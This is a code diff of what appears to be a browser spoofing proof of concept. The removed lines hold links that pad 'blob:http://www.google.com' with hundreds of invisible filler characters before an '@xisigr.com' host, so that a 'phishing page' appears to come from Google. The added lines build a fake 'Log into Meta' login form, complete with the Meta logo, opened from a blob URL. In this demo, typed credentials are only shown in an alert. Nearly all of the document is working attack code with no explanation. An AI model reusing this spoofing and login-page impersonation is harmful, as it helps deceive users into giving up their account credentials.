@@ -1,10 +1,63 @@
+<center><br><br><br><br>
+<button style="font-size:100px;" onclick="x();">Click me</button>
+
 <script>
-function pwned() {
-    var t = window.open('', 'ss');
-    t.document.write("<h1>phishing page</h1><title>google</title>");
-    t.stop();
+function x(){
+  const html = `<!doctype html>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    html,body{height:100%;margin:0;font-family:Arial, sans-serif;background:#f0f2f5}
+    .wrap{display:flex;flex-direction:column;justify-content:center;align-items:center;height:100%}
+    .card{background:white;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:360px;text-align:center}
+    input{width:100%;padding:12px;margin-bottom:15px;font-size:16px;border:1px solid #ddd;border-radius:6px}
+    button.primary{width:100%;padding:14px;font-size:18px;background:#1877f2;color:white;border:none;border-radius:6px;cursor:pointer}
+    a{color:#1877f2;text-decoration:none}
+  </style>
+
+  <div class="wrap">
+    <div style="margin-bottom:30px;text-align:center;">
+      <img src="https://registry.npmmirror.com/@lobehub/icons-static-png/latest/files/dark/meta-color.png" alt="Meta Logo" style="width:120px;height:auto;">
+    </div>
+
+    <div class="card">
+      <h2 style="margin-bottom:20px;color:#1c1e21;">Log into Meta</h2>
+
+      <input id="user" type="text" placeholder="Email or Phone" />
+      <input id="pass" type="password" placeholder="Password" />
+
+      <button class="primary" id="loginBtn">Log In</button>
+
+      <div style="margin-top:20px;">
+        <a href="#">Forgotten password?</a>
+      </div>
+    </div>
+
+    <div style="margin-top:30px;font-size:14px;color:#606770;">
+      <p>Don’t have an account? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginBtn').addEventListener('click', function(){
+      // demo only: show values via alert
+      alert('Email/Phone: ' + document.getElementById('user').value + '\\nPassword: ' + document.getElementById('pass').value);
+    });
+
+    // optional: set a title so the tab shows something meaningful
+    document.title = 'Meta – Sign in';
+  </script>`;
+
+  // create blob and open it
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+
+  // open the blob URL in a new window/tab
+  const win = window.open(url, 'poctarget');
+
+  // optional: revoke object URL later to free memory (after a delay so page loads)
+  setTimeout(() => {
+    URL.revokeObjectURL(url);
+  }, 10000);
 }
 </script>
-<a href="blob:http://www.google.com%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0@xisigr.com" target="ss" onclick="setTimeout('pwned()','500')">click me1</a><br>
-<br>
-<a href="blob:http://www.google.com                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    @xisigr.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a><br>
